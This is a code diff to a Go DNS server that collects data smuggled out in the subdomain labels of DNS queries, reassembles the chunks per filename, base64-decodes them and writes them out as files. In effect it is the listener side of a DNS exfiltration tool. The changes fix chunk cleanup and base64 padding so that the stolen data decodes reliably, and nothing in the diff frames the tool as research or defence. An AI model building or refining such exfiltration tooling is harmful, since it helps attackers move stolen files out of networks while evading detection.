@@ -31,8 +31,11 @@ func handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
             filename := parts[len(parts)-2] // filename is the part before the root domain
             chunks := parts[:len(parts)-2] // the data chunks are everything before filename
             chunkData := strings.Join(chunks, "")
-            chunkData = strings.ReplaceAll(chunkData, "-", "")
-            dataStore[filename] = append(dataStore[filename], chunkData)
+            //chunkData = strings.ReplaceAll(chunkData, "-", "")
+            chunkData = strings.ReplaceAll(chunkData, "-", "") // if you were using '-' as delimiter
+						chunkData = strings.ReplaceAll(chunkData, ".", "") // Remove dots accidentally inserted from domain structure
+
+						dataStore[filename] = append(dataStore[filename], chunkData)
             mutex.Unlock()
 
             fmt.Printf("[+] Received chunk for %s\n", filename)
@@ -58,7 +61,12 @@ func saveFiles() {
     defer mutex.Unlock()
     for filename, chunks := range dataStore {
         fullData := strings.Join(chunks, "")
-        decoded, err := base64.StdEncoding.DecodeString(fullData)
+				// base64 requires padding, add if needed
+				missingPadding := len(fullData) % 4
+				if missingPadding != 0 {
+    			fullData += strings.Repeat("=", 4 - missingPadding)
+					}
+				decoded, err := base64.StdEncoding.DecodeString(fullData)
         if err != nil {
             fmt.Printf("[-] Failed to decode base64 for %s: %s\n", filename, err)
             continue
